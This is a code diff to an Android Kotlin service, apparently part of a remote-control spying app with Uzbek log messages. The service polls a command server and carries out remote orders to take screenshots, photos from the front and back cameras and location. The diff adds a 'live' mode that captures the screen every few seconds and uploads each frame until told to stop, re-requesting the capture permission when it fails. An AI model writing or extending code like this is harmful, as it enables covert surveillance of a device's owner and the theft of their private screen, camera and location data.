@@ -23,11 +23,16 @@ import kotlinx.coroutines.launch
 class HullasService : Service() {
     private val tag = "HullasService"
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
+    private val serviceLifecycle = ServiceLifecycleOwner()
     private var pollJob: Job? = null
+    private var liveJob: Job? = null
+    @Volatile private var liveCommandId: String? = null
 
     override fun onCreate() {
         super.onCreate()
         isRunning = true
+        serviceLifecycle.resume()
+        AppLifecycle.serviceLifecycle = serviceLifecycle
         startForegroundNotify()
         startPolling()
         Log.i(tag, "Service started")
@@ -38,8 +43,12 @@ class HullasService : Service() {
 
     override fun onDestroy() {
         isRunning = false
+        liveJob?.cancel()
+        liveCommandId = null
         pollJob?.cancel()
         scope.cancel()
+        AppLifecycle.serviceLifecycle = null
+        serviceLifecycle.destroy()
         Log.i(tag, "Service stopped")
         super.onDestroy()
     }
@@ -74,10 +83,12 @@ class HullasService : Service() {
                         Prefs.setLastHeartbeat(this@HullasService)
                     }
                     beat++
-                    val cmd = api.poll()
-                    if (cmd != null) {
-                        Log.i(tag, "Buyruq: ${cmd.cmd}")
-                        handleCommand(api, executor, cmd)
+                    if (liveCommandId == null) {
+                        val cmd = api.poll()
+                        if (cmd != null) {
+                            Log.i(tag, "Buyruq: ${cmd.cmd}")
+                            handleCommand(api, executor, cmd)
+                        }
                     }
                 } catch (e: Exception) {
                     Log.e(tag, "Poll xato", e)
@@ -103,15 +114,16 @@ class HullasService : Service() {
             .build()
     }
 
-    private fun setForegroundMode(screenshot: Boolean) {
+    private fun setForegroundMode(screenshot: Boolean = false, camera: Boolean = false) {
         val notification = buildNotification()
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-                val type = if (screenshot) {
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
-                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
-                } else {
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+                var type = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+                if (screenshot) {
+                    type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
+                }
+                if (camera) {
+                    type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                 }
                 startForeground(NOTIF_ID, notification, type)
             } else {
@@ -123,16 +135,35 @@ class HullasService : Service() {
         }
     }
 
+    private fun needsScreenshot(cmd: String): Boolean =
+        cmd == "screenshot" || cmd == "live_start"
+
+    private fun needsCamera(cmd: String): Boolean =
+        cmd == "cam_back" || cmd == "cam_front" || cmd == "photo"
+
     private suspend fun handleCommand(
         api: ApiClient,
         executor: CommandExecutor,
         cmd: Command,
     ) {
-        if (cmd.cmd == "screenshot") setForegroundMode(screenshot = true)
+        when (cmd.cmd) {
+            "live_start" -> {
+                startLiveMode(api, cmd)
+                return
+            }
+            "live_stop" -> {
+                stopLiveMode(api, cmd)
+                return
+            }
+        }
+        val shot = needsScreenshot(cmd.cmd)
+        val cam = needsCamera(cmd.cmd)
+        if (shot || cam) setForegroundMode(screenshot = shot, camera = cam)
+        if (shot) ProjectionHelper.warmUp(this)
         val result = try {
             executor.execute(cmd)
         } finally {
-            if (cmd.cmd == "screenshot") setForegroundMode(screenshot = false)
+            if (shot || cam) setForegroundMode()
         }
         result.onSuccess { file ->
             if (cmd.cmd == "location") return@onSuccess
@@ -155,6 +186,54 @@ class HullasService : Service() {
                 else -> api.sendResult(cmd.id, "failed", error = e.message ?: "xato")
             }
         }
+    }
+
+    private fun startLiveMode(api: ApiClient, cmd: Command) {
+        liveJob?.cancel()
+        liveCommandId = cmd.id
+        setForegroundMode(screenshot = true)
+        ProjectionHelper.warmUp(this)
+        Log.i(tag, "Live boshlandi: ${cmd.id}")
+        liveJob = scope.launch {
+            var frames = 0
+            while (isActive && liveCommandId == cmd.id) {
+                try {
+                    val stopCmd = api.poll()
+                    if (stopCmd?.cmd == "live_stop") {
+                        Log.i(tag, "Live stop buyrug'i olindi")
+                        stopLiveMode(api, stopCmd)
+                        return@launch
+                    }
+                    val file = ProjectionHelper.captureScreenshot(this@HullasService)
+                    if (api.sendLiveFrame(cmd.id, file)) {
+                        frames++
+                    }
+                    file.delete()
+                } catch (e: ScreenshotException) {
+                    Log.e(tag, "Live screenshot", e)
+                    api.sendResult(cmd.id, "failed", error = e.message)
+                    ProjectionHelper.requestPermission(this@HullasService)
+                    liveCommandId = null
+                    setForegroundMode(screenshot = false)
+                    return@launch
+                } catch (e: Exception) {
+                    Log.e(tag, "Live loop", e)
+                }
+                delay(2_500)
+            }
+            liveCommandId = null
+            setForegroundMode(screenshot = false)
+            Log.i(tag, "Live tugadi, kadrlar: $frames")
+        }
+    }
+
+    private fun stopLiveMode(api: ApiClient, cmd: Command) {
+        liveJob?.cancel()
+        liveJob = null
+        liveCommandId = null
+        setForegroundMode(screenshot = false)
+        api.sendResult(cmd.id, "done")
+        Log.i(tag, "Live to'xtatildi")
     }
 
     companion object {
